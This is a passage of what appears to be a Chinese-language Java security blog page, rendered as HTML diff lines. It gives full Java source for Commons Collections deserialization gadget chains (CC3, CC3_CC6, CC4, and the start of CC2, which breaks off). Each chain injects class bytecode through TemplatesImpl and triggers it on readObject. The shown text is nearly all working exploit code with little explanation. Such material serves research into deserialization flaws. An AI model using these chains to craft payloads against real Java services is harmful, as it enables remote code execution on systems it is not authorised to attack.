+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InstantiateTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.InvocationHandler;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Proxy;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC3</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class tc <span style="color:#f92672">=</span> templates.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Field nameField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>        nameField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        nameField.<span style="color:#a6e22e">set</span>(templates,<span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>        Field tfactoryFile <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_tfactory&#34;</span>);
+</span></span><span style="display:flex;"><span>        tfactoryFile.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        tfactoryFile.<span style="color:#a6e22e">set</span>(templates,<span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        Field byteCodesField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>        byteCodesField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;E:\\Compiler\\Idea\\JavaSec\\target\\classes\\Gadget\\CC3\\Test.class&#34;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> codes <span style="color:#f92672">=</span> {code};
+</span></span><span style="display:flex;"><span>        byteCodesField.<span style="color:#a6e22e">set</span>(templates,codes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{templates})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(map,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor annotationInvocationHandlerConstructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructor</span>(Class.<span style="color:#a6e22e">class</span>,Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        annotationInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        InvocationHandler h <span style="color:#f92672">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>,lazyMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Map mapProxy <span style="color:#f92672">=</span> (Map) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(LazyMap.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getClassLoader</span>(),<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Map.<span style="color:#a6e22e">class</span>},h);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Override.<span style="color:#a6e22e">class</span>,mapProxy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc3_cc6">CC3_CC6</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InstantiateTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.TransformerConfigurationException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.InvocationTargetException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC3_CC6</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String field, Object value) <span style="color:#66d9ef">throws</span> NoSuchFieldException, IllegalAccessException {
+</span></span><span style="display:flex;"><span>        Class<span style="color:#f92672">&lt;?&gt;</span> clazz <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Field fieldName <span style="color:#f92672">=</span> clazz.<span style="color:#a6e22e">getDeclaredField</span>(field);
+</span></span><span style="display:flex;"><span>        fieldName.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        fieldName.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;E:\\Compiler\\Idea\\target\\classes\\xyz\\Gadget\\CC3\\Test.class&#34;</span>));
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(templates, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;xxx&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(templates, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        setFieldValue(templates, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{code});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> fakeformers <span style="color:#f92672">=</span> {<span style="color:#66d9ef">new</span> ConstantTransformer(1)};
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{templates})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// fakeformers 绕开put</span>
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(fakeformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        hashMap.<span style="color:#a6e22e">put</span>(tiedMapEntry,<span style="color:#e6db74">&#34;bbb&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        lazyMap.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(chainedTransformer,<span style="color:#e6db74">&#34;iTransformers&#34;</span>,transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc4">CC4</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.xml.transform.Templates;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC4</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        Class tc <span style="color:#f92672">=</span> templates.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Field nameField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>        nameField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        nameField.<span style="color:#a6e22e">set</span>(templates,<span style="color:#e6db74">&#34;aaa&#34;</span>);
+</span></span><span style="display:flex;"><span>        Field tfactoryField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_tfactory&#34;</span>);
+</span></span><span style="display:flex;"><span>        tfactoryField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        tfactoryField.<span style="color:#a6e22e">set</span>(templates,<span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        Field byteCodesField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>        byteCodesField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;E:\\Compiler\\Idea\\JavaSec\\target\\classes\\Gadget\\CC3\\Test.class&#34;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> codes <span style="color:#f92672">=</span> {code};
+</span></span><span style="display:flex;"><span>        byteCodesField.<span style="color:#a6e22e">set</span>(templates,codes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        InstantiateTransformer instantiateTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{templates});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                (Transformer) instantiateTransformer
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        TransformingComparator transformingComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(<span style="color:#66d9ef">new</span> ConstantTransformer(1));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        PriorityQueue priorityQueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(transformingComparator);
+</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>        priorityQueue.<span style="color:#a6e22e">add</span>(2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> transformingComparator.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Field transformerField <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;transformer&#34;</span>);
+</span></span><span style="display:flex;"><span>        transformerField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        transformerField.<span style="color:#a6e22e">set</span>(transformingComparator,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(priorityQueue);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="cc2">CC2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC2</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        Class tc <span style="color:#f92672">=</span> templates.<span style="color:#a6e22e">getClass</span>();
+</span></span><span style="display:flex;"><span>        Field nameField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>        nameField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        nameField.<span style="color:#a6e22e">set</span>(templates,<span style="color:#e6db74">&#34;aaaa&#34;</span>);
+</span></span><span style="display:flex;"><span>        Field bytecodesField <span style="color:#f92672">=</span> tc.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>        bytecodesField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;E:\\Compiler\\Idea\\JavaSec\\target\\classes\\Gadget\\CC3\\Test.class&#34;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> codes <span style="color:#f92672">=</span> {code};
+</span></span><span style="display:flex;"><span>        bytecodesField.<span style="color:#a6e22e">set</span>(templates,codes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        InvokerTransformer<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> invokerTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">&lt;&gt;</span>(<span style="color:#e6db74">&#34;newTransformer&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        TransformingComparator transformingComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(<span style="color:#66d9ef">new</span> ConstantTransformer(1));
+</span></span><span style="display:flex;"><span>
